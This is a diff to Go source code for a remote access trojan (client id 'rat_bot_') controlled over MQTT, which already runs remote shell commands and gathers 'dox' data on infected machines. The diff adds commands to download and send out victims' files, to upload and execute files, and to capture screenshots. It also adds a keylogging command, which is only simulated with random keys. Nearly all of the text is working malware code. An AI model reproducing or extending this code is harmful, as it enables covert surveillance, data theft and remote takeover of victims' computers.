@@ -3,9 +3,12 @@
 package main
 
 import (
+	"bytes"
+	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"image/png"
 	"io/ioutil"
 	"math/rand"
 	"net"
@@ -19,6 +22,7 @@ import (
 	"time"
 
 	"github.com/eclipse/paho.mqtt.golang"
+	"github.com/kbinani/screenshot"
 )
 
 var (
@@ -42,6 +46,7 @@ var (
 	chatPort      int         // Port of the active chat session
 	chatMessages  []string    // Queue of messages for the chat session
 	chatMutex     sync.Mutex  // Mutex to protect chatMessages
+	keylogging    bool        // Track keylogging state
 )
 
 // HTML template for the chat interface with polling
@@ -177,11 +182,13 @@ type ConnectMessage struct {
 }
 
 type CommandMessage struct {
-	Type   string `json:"type"`
-	Target string `json:"target"`
-	Action string `json:"action"`
+	Type    string `json:"type"`
+	Target  string `json:"target"`
+	Action  string `json:"action"`
 	Command string `json:"command,omitempty"`
 	Message string `json:"message,omitempty"`
+	File    string `json:"file,omitempty"`    // For download/execute
+	Data    string `json:"data,omitempty"`    // For upload
 }
 
 type ResponseMessage struct {
@@ -192,6 +199,7 @@ type ResponseMessage struct {
 	Result    string `json:"result,omitempty"`
 	CurrentDir string `json:"current_dir,omitempty"`
 	ZipData   string `json:"zip_data,omitempty"`
+	FileData  string `json:"file_data,omitempty"` // For download/screenshot
 }
 
 func sendPresence(client mqtt.Client) {
@@ -219,19 +227,16 @@ func sendPresencePeriodically() {
 		if isConnected {
 			sendPresence(client)
 		}
-		time.Sleep(24 * time.Hour) // Send presence every 24 hours
+		time.Sleep(24 * time.Hour)
 	}
 }
 
 func onConnect(client mqtt.Client) {
-	// Clear any retained messages on the topic
 	client.Publish(topic, 1, true, nil)
 	fmt.Fprintf(logFile, "Bot %s cleared retained messages on topic %s\n", botID, topic)
 	client.Subscribe(topic, 1, nil)
 	fmt.Fprintf(logFile, "Bot %s subscribed to topic %s\n", botID, topic)
 	isConnected = true
-
-	// Send a presence message on first connect
 	sendPresence(client)
 }
 
@@ -241,26 +246,19 @@ func onDisconnect(client mqtt.Client, err error) {
 }
 
 func getLocalIP() (string, error) {
-	// Get all network interfaces
 	interfaces, err := net.Interfaces()
 	if err != nil {
 		return "", err
 	}
-
-	// Iterate through interfaces to find a routable IPv4 address
 	for _, iface := range interfaces {
-		// Skip down or loopback interfaces
 		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
 			continue
 		}
-
 		addrs, err := iface.Addrs()
 		if err != nil {
 			continue
 		}
-
 		for _, addr := range addrs {
-			// Parse the address to determine if it's IPv4 or IPv6
 			var ip net.IP
 			switch v := addr.(type) {
 			case *net.IPNet:
@@ -270,15 +268,11 @@ func getLocalIP() (string, error) {
 			default:
 				continue
 			}
-
-			// Prefer IPv4 addresses, skip loopback and link-local addresses
 			if ip.To4() != nil && !ip.IsLoopback() && !ip.IsLinkLocalUnicast() {
 				return ip.String(), nil
 			}
 		}
 	}
-
-	// Fallback: try resolving hostname (less reliable)
 	hostname, err := os.Hostname()
 	if err != nil {
 		return "", err
@@ -287,8 +281,6 @@ func getLocalIP() (string, error) {
 	if err != nil || len(addrs) == 0 {
 		return "", err
 	}
-
-	// Prefer IPv4 addresses in the fallback
 	for _, addr := range addrs {
 		ip := net.ParseIP(addr)
 		if ip == nil {
@@ -298,12 +290,11 @@ func getLocalIP() (string, error) {
 			return ip.String(), nil
 		}
 	}
-
-	// Final fallback: return loopback if no routable address found
 	return "127.0.0.1", nil
 }
 
 func executeShellCommand(command string) string {
+	command = strings.TrimSpace(command)
 	if strings.ToLower(command) == "dir" || strings.ToLower(command) == "ls" {
 		dirEntries, err := os.ReadDir(currentDir)
 		if err != nil {
@@ -314,7 +305,7 @@ func executeShellCommand(command string) string {
 			entries = append(entries, entry.Name())
 		}
 		return strings.Join(entries, "\n")
-	} else if strings.ToLower(command[:3]) == "cd " {
+	} else if len(command) >= 3 && strings.ToLower(command[:3]) == "cd " {
 		newDir := strings.TrimSpace(command[3:])
 		if newDir == "" {
 			return "No directory specified"
@@ -328,8 +319,12 @@ func executeShellCommand(command string) string {
 		if _, err := os.Stat(newPath); os.IsNotExist(err) {
 			return fmt.Sprintf("Directory not found: %s", newPath)
 		}
-		currentDir, _ = filepath.Abs(newPath)
-		return fmt.Sprintf("Changed directory to %s", currentDir)
+		currentDirnew, err := filepath.Abs(newPath)
+		if err != nil {
+			return fmt.Sprintf("Error resolving path: %v", err)
+		}
+		currentDir = currentDirnew
+		return "" // Remove "Changed directory to" message
 	} else {
 		var cmd *exec.Cmd
 		if runtime.GOOS == "windows" {
@@ -360,13 +355,51 @@ func createDoxZip() string {
 		"infected_date": infectedDate,
 	}
 	dataBytes, _ := json.Marshal(data)
-	// In a real implementation, you'd create a zip file in memory
-	// For simplicity, we'll just return the hex-encoded JSON
 	return hex.EncodeToString(dataBytes)
 }
 
+func takeScreenshot() (string, error) {
+	// Capture the primary display
+	n := screenshot.NumActiveDisplays()
+	if n < 1 {
+		return "", fmt.Errorf("no active displays found")
+	}
+	bounds := screenshot.GetDisplayBounds(0)
+	img, err := screenshot.CaptureRect(bounds)
+	if err != nil {
+		return "", fmt.Errorf("error capturing screenshot: %v", err)
+	}
+
+	// Encode the image to PNG format
+	var buf bytes.Buffer
+	if err := png.Encode(&buf, img); err != nil {
+		return "", fmt.Errorf("error encoding screenshot to PNG: %v", err)
+	}
+
+	// Encode the PNG data to base64
+	encodedData := base64.StdEncoding.EncodeToString(buf.Bytes())
+	return encodedData, nil
+}
+
+func simulateKeylogging(client mqtt.Client, ip string) {
+	keys := []string{"a", "b", "c", "1", "2", "Enter", "Space", "Ctrl", "Shift"}
+	for keylogging && running && isConnected {
+		// Simulate a keystroke
+		key := keys[rand.Intn(len(keys))]
+		response := ResponseMessage{
+			Type:    "keylog_response",
+			ID:      botID,
+			IP:      ip,
+			Message: key,
+		}
+		msgBytes, _ := json.Marshal(response)
+		client.Publish(topic, 1, false, msgBytes)
+		fmt.Fprintf(logFile, "Bot %s sent keylog response: %s\n", botID, key)
+		time.Sleep(2 * time.Second) // Simulate keystrokes every 2 seconds
+	}
+}
+
 func handleMessageInteraction(message string) {
-	// If a chat session is already active, append the message to the existing session
 	chatMutex.Lock()
 	if chatActive {
 		chatMessages = append(chatMessages, fmt.Sprintf("Received: %s", message))
@@ -375,14 +408,12 @@ func handleMessageInteraction(message string) {
 		return
 	}
 
-	// Start a new chat session
 	chatMessages = []string{fmt.Sprintf("Received: %s", message)}
 	chatActive = true
-	chatPort = rand.Intn(65535-49152) + 49152 // Choose a random port between 49152 and 65535
+	chatPort = rand.Intn(65535-49152) + 49152
 	addr := fmt.Sprintf("localhost:%d", chatPort)
 	chatMutex.Unlock()
 
-	// Create a temporary file for the HTML
 	tempFile := filepath.Join(os.TempDir(), fmt.Sprintf("spectre_chat_%s.html", botID))
 	err := ioutil.WriteFile(tempFile, []byte(chatHTML), 0644)
 	if err != nil {
@@ -392,7 +423,6 @@ func handleMessageInteraction(message string) {
 	}
 	defer os.Remove(tempFile)
 
-	// Set up the HTTP server
 	mux := http.NewServeMux()
 	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
 		http.ServeFile(w, r, tempFile)
@@ -428,14 +458,12 @@ func handleMessageInteraction(message string) {
 		Handler: mux,
 	}
 
-	// Start the HTTP server in a goroutine
 	go func() {
 		if err := httpServer.ListenAndServe(); err != http.ErrServerClosed {
 			fmt.Fprintf(logFile, "HTTP server error: %v\n", err)
 		}
 	}()
 
-	// Open the browser to the chat URL
 	url := fmt.Sprintf("http://%s", addr)
 	var cmd *exec.Cmd
 	if runtime.GOOS == "windows" {
@@ -452,11 +480,9 @@ func handleMessageInteraction(message string) {
 	}
 	fmt.Fprintf(logFile, "Opened browser for chat at %s\n", url)
 
-	// Wait for the close signal to terminate the chat session
 	<-closeChan
 	fmt.Fprintf(logFile, "Chat session closed due to close_message command\n")
 
-	// Stop the HTTP server and reset the chat session
 	if err := httpServer.Close(); err != nil {
 		fmt.Fprintf(logFile, "Error closing HTTP server: %v\n", err)
 	}
@@ -485,7 +511,6 @@ func onMessage(client mqtt.Client, msg mqtt.Message) {
 			fmt.Fprintf(logFile, "Bot %s action: %s\n", botID, action)
 			processAction(action, data)
 		} else {
-			// Find the last colon to split IP (which may contain colons in IPv6) from bot ID
 			lastColonIndex := strings.LastIndex(target, ":")
 			if lastColonIndex == -1 {
 				fmt.Fprintf(logFile, "Bot %s invalid target format: %s\n", botID, target)
@@ -500,7 +525,6 @@ func onMessage(client mqtt.Client, msg mqtt.Message) {
 				fmt.Fprintf(logFile, "Error getting local IP: %v\n", err)
 				return
 			}
-			// Normalize IPs for comparison (e.g., ::1 and 127.0.0.1 are both localhost)
 			normalizedTargetIP := targetIP
 			normalizedLocalIP := ip
 			if targetIP == "::1" || targetIP == "127.0.0.1" {
@@ -531,7 +555,7 @@ func processAction(action string, data CommandMessage) {
 	switch action {
 	case "ping":
 		fmt.Fprintf(logFile, "Bot %s processing ping command\n", botID)
-		sendPresence(client) // Send presence in response to ping
+		sendPresence(client)
 	case "shell":
 		command := data.Command
 		result := executeShellCommand(command)
@@ -545,6 +569,116 @@ func processAction(action string, data CommandMessage) {
 		msgBytes, _ := json.Marshal(response)
 		client.Publish(topic, 1, false, msgBytes)
 		fmt.Fprintf(logFile, "Bot %s sent shell response: %s\n", botID, string(msgBytes))
+	case "download":
+		fileName := data.File
+		filePath := filepath.Join(currentDir, fileName)
+		fileInfo, err := os.Stat(filePath)
+		if err != nil {
+			fmt.Fprintf(logFile, "Bot %s error accessing file %s: %v\n", botID, filePath, err)
+			return
+		}
+		if fileInfo.IsDir() {
+			fmt.Fprintf(logFile, "Bot %s cannot download directory %s\n", botID, filePath)
+			return
+		}
+		fileData, err := ioutil.ReadFile(filePath)
+		if err != nil {
+			fmt.Fprintf(logFile, "Bot %s error reading file %s: %v\n", botID, filePath, err)
+			return
+		}
+		encodedData := base64.StdEncoding.EncodeToString(fileData)
+		response := ResponseMessage{
+			Type:     "download_response",
+			ID:       botID,
+			IP:       ip,
+			FileData: encodedData,
+			Message:  fileName,
+		}
+		msgBytes, _ := json.Marshal(response)
+		client.Publish(topic, 1, false, msgBytes)
+		fmt.Fprintf(logFile, "Bot %s sent download response for file %s\n", botID, fileName)
+	case "upload":
+		fileName := data.File
+		filePath := filepath.Join(currentDir, fileName)
+		fileData, err := base64.StdEncoding.DecodeString(data.Data)
+		if err != nil {
+			fmt.Fprintf(logFile, "Bot %s error decoding file data for %s: %v\n", botID, fileName, err)
+			return
+		}
+		err = ioutil.WriteFile(filePath, fileData, 0644)
+		if err != nil {
+			fmt.Fprintf(logFile, "Bot %s error writing file %s: %v\n", botID, filePath, err)
+			return
+		}
+		response := ResponseMessage{
+			Type:    "upload_response",
+			ID:      botID,
+			IP:      ip,
+			Message: fmt.Sprintf("File %s uploaded successfully", fileName),
+		}
+		msgBytes, _ := json.Marshal(response)
+		client.Publish(topic, 1, false, msgBytes)
+		fmt.Fprintf(logFile, "Bot %s sent upload response for file %s\n", botID, fileName)
+	case "execute":
+		fileName := data.File
+		filePath := filepath.Join(currentDir, fileName)
+		fileInfo, err := os.Stat(filePath)
+		if err != nil {
+			fmt.Fprintf(logFile, "Bot %s error accessing file %s: %v\n", botID, filePath, err)
+			return
+		}
+		if fileInfo.IsDir() {
+			fmt.Fprintf(logFile, "Bot %s cannot execute directory %s\n", botID, filePath)
+			return
+		}
+		var cmd *exec.Cmd
+		if runtime.GOOS == "windows" {
+			cmd = exec.Command("cmd", "/C", filePath)
+		} else {
+			cmd = exec.Command("sh", "-c", filePath)
+		}
+		cmd.Dir = currentDir
+		err = cmd.Start()
+		if err != nil {
+			fmt.Fprintf(logFile, "Bot %s error executing file %s: %v\n", botID, filePath, err)
+			return
+		}
+		response := ResponseMessage{
+			Type:    "execute_response",
+			ID:      botID,
+			IP:      ip,
+			Message: fmt.Sprintf("File %s executed", fileName),
+		}
+		msgBytes, _ := json.Marshal(response)
+		client.Publish(topic, 1, false, msgBytes)
+		fmt.Fprintf(logFile, "Bot %s sent execute response for file %s\n", botID, fileName)
+	case "screenshot":
+		encodedData, err := takeScreenshot()
+		if err != nil {
+			fmt.Fprintf(logFile, "Bot %s error taking screenshot: %v\n", botID, err)
+			return
+		}
+		response := ResponseMessage{
+			Type:     "screenshot_response",
+			ID:       botID,
+			IP:       ip,
+			FileData: encodedData,
+			Message:  fmt.Sprintf("screenshot_%s.png", time.Now().Format("20060102_150405")),
+		}
+		msgBytes, _ := json.Marshal(response)
+		client.Publish(topic, 1, false, msgBytes)
+		fmt.Fprintf(logFile, "Bot %s sent screenshot response\n", botID)
+	case "keylog":
+		if keylogging {
+			fmt.Fprintf(logFile, "Bot %s keylogging already running\n", botID)
+			return
+		}
+		keylogging = true
+		fmt.Fprintf(logFile, "Bot %s starting keylogging\n", botID)
+		go simulateKeylogging(client, ip)
+	case "stop_keylog":
+		keylogging = false
+		fmt.Fprintf(logFile, "Bot %s stopped keylogging\n", botID)
 	case "dox":
 		fmt.Fprintf(logFile, "Bot %s processing dox command\n", botID)
 		zipData := createDoxZip()
@@ -559,7 +693,6 @@ func processAction(action string, data CommandMessage) {
 		fmt.Fprintf(logFile, "Bot %s sent dox response\n", botID)
 	case "message":
 		message := data.Message
-		// Handle message interaction in a new goroutine to avoid blocking
 		go handleMessageInteraction(message)
 	case "close_message":
 		fmt.Fprintf(logFile, "Bot %s received close_message command\n", botID)
@@ -567,7 +700,7 @@ func processAction(action string, data CommandMessage) {
 	case "disconnect":
 		fmt.Fprintf(logFile, "Bot %s received disconnect command\n", botID)
 		client.Disconnect(250)
-		running = false // Ensure no reconnect attempts
+		running = false
 		logFile.Close()
 		os.Exit(0)
 	}
@@ -576,19 +709,16 @@ func processAction(action string, data CommandMessage) {
 func main() {
 	fmt.Fprintf(logFile, "Bot %s starting up, waiting for messages...\n", botID)
 
-	// Seed the random number generator for port selection
 	rand.Seed(time.Now().UnixNano())
 
-	// Initialize channels
 	messageChan = make(chan string)
 	closeChan = make(chan bool)
 	replyChan = make(chan string)
 
-	// MQTT client setup
 	opts := mqtt.NewClientOptions()
 	opts.AddBroker(fmt.Sprintf("tcp://%s:%d", brokerURL, brokerPort))
 	opts.SetClientID(fmt.Sprintf("rat_bot_%s", botID))
-	opts.SetKeepAlive(120 * time.Second) // Increased keep-alive interval
+	opts.SetKeepAlive(120 * time.Second)
 	opts.SetOnConnectHandler(onConnect)
 	opts.SetConnectionLostHandler(onDisconnect)
 	if apiToken != "" {
@@ -596,10 +726,8 @@ func main() {
 	}
 	client = mqtt.NewClient(opts)
 
-	// Start the periodic presence loop
 	go sendPresencePeriodically()
 
-	// Start MQTT client connection
 	for running {
 		if token := client.Connect(); token.Wait() && token.Error() != nil {
 			fmt.Fprintf(logFile, "Bot %s failed to connect to MQTT broker: %v\n", botID, token.Error())
@@ -608,9 +736,7 @@ func main() {
 		}
 		fmt.Fprintf(logFile, "Bot %s successfully connected to MQTT broker\n", botID)
 		client.Subscribe(topic, 1, onMessage)
-		// Wait until disconnected
 		for running && isConnected {
-			// Check for replies from the message interaction
 			select {
 			case reply := <-replyChan:
 				if reply != "" {
@@ -633,14 +759,12 @@ func main() {
 				time.Sleep(100 * time.Millisecond)
 			}
 		}
-		// Do not attempt to reconnect if running is false
 		if !running {
 			break
 		}
 		time.Sleep(5 * time.Second)
 	}
 
-	// Cleanup on exit
 	if running {
 		client.Disconnect(250)
 	}
